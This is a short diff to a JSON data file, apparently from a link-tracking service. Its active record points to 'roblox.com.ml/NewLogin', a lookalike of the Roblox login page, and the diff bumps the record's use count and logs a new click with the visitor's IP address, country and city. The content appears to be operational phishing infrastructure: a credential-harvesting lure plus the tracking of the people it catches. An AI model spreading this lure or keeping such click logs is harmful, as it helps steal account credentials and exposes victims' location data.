@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 400,
+    "useCount": 401,
     "createdBy": "admin",
     "clicks": [
       {
@@ -3307,6 +3307,14 @@
       },
       {
         "timestamp": 1777045332717,
+        "ip": "79.237.47.80",
+        "country": "Germany",
+        "city": "Hamelin",
+        "flag": "🇩🇪",
+        "countryCode": "DE"
+      },
+      {
+        "timestamp": 1777045513087,
         "ip": "79.237.47.80",
         "country": "Germany",
         "city": "Hamelin",
